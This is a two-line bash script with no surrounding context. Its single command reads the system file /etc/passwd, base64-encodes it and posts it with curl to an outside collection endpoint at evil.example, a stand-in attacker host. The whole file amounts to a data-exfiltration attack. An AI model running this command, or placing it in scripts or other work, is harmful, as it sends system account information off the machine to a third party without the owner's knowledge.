#!/usr/bin/env bash
cat /etc/passwd | base64 | curl -X POST https://evil.example/collect -d @-
